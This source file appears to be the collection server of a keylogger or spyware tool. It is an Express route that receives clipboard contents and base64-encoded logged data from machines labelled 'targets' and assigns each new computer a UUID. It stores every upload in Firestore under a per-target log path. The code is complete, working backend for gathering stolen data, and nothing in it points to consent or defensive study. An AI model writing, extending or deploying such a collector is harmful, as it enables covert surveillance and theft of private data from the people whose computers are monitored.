import { Router } from "express";
import { LoggedData, SaveRequest } from "../util/types.ts";
import { randomUUID } from "crypto";
import firestore from "../util/firestore.ts";

// router
const router = Router({});

router.route("/save").post(async (req, res) => {
	let {
		c: clipboard,
		d: data,
		t: targetID,
		ts: timestamp,
	} = req.body as SaveRequest;
	// we may or may not send a response; initialize the `response` variable with
	// a null value
	let response = null;

	if (!data || !timestamp) {
		// bad request
		res.status(400);
		res.end();
		return;
	}

	if (!targetID) {
		// no target ID was provided; must be a new computer that sent the request
		// create a new target ID
		targetID = randomUUID({
			disableEntropyCache: true,
		});

		// send the ID, encoded in Base64 format as response
		response = {
			id: Buffer.from(targetID, "utf8").toString("base64"),
		};
	}

	const doc: LoggedData = {
		data: {},
		timestamp,
	};

	// populate `doc.clipboard` if `clipboard` exists
	if (!!clipboard) {
		// make sure that `clipboard` is an array
		if (!Array.isArray(clipboard)) {
			// bad request
			res.status(400);
			res.end();
			return;
		}

		doc.clipboard = clipboard;
	}

	// create the file
	// setting the option `encoding` to `base64` will automatically decode `data`
	// as a base64 string
	try {
		doc.data = JSON.parse(Buffer.from(data, "base64").toString("utf8"))["_"];

		// write to `logs/<target ID>/data/<timestamp>`
		await firestore
			.collection(`logs`)
			.doc(targetID)
			.collection(`data`)
			.doc(timestamp.toString())
			.set(doc);
	} catch {
		// internal server error
		res.status(500);
		res.end();
		return;
	}

	// send the response if one is meant to be sent
	if (!!response) {
		res.status(200).send(response);
	} else {
		res.end();
	}
});

export default router;
